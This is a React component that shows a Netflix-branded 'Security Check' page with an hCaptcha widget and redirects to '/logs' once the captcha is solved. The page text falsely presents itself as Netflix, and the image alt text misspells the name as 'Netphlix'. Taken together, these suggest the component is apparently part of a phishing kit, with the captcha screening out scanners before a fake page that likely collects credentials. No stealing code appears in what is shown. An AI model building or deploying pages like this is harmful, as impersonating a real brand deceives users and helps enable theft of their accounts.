import HCaptcha from "@hcaptcha/react-hcaptcha";
import { useRef, useState } from "react";
import appConfig from "../app.config";

interface CaptchaProps {}

function Captcha(props: CaptchaProps) {
  const [token, setToken] = useState<string>("");
  const [isCaptchaValid, setIsCaptchaValid] = useState<boolean>(false);
  const captcha = useRef<HCaptcha | null>(null);

  const handleCaptchaVerify = (newToken: string) => {
    setToken(newToken);
    setIsCaptchaValid(true);
  };

  const handleCaptchaExpire = () => {
    setToken("");
    setIsCaptchaValid(false);
  };

  const handleContinueClick = () => {
    if (isCaptchaValid) {
      window.location.href = "/logs";
    }
  };

  return (
    <div>
      <div className="flex justify-center items-center h-screen">
        <div className="max-w-xl rounded border border-gray-200 mt-13">
          <img className="w-full" src="./marshall.jpg" alt="Captcha in Netphlix" />
          <div className="max-w-xl rounded border border-gray-200 mt-13">
            <div className="flex justify-center items-center">
              <img
                style={{ height: "50px", marginTop: "40px" }}
                src="./logo.svg"
                alt="logo"
              />
            </div>
            <div className="p-6 text-center">
              <div className="flex justify-center items-center"></div>
              <div className="text-3xl mb-4 font-montserrat">
                Security Check
              </div>
              <p className="text-white text-base">
                Netflix uses a security test to ensure that the people on the
                site are real. Please fill out the security check below to
                continue further.
              </p>
              <br />
              <div className="flex font-montserrat justify-center items-center">
                <HCaptcha
                  ref={(el) => (captcha.current = el)}
                  sitekey={appConfig.hCaptchaKey}
                  onVerify={handleCaptchaVerify}
                  onExpire={handleCaptchaExpire}
                />
              </div>
            </div>
            <div style={{ padding: ".2rem" }} className="w-full text-center">
              <div className="p-6 text-center">
                <button
                  type="button"
                  className={`${
                    isCaptchaValid ? "bg-red-600" : "bg-red-200"
                  } text-white py-2 px-4 rounded-none w-full lg:w-2/3 lg:text-lg cursor-pointer`}
                  disabled={!isCaptchaValid}
                  style={{ width: "90%" }}
                  onClick={handleContinueClick}
                >
                  Continue
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Captcha;
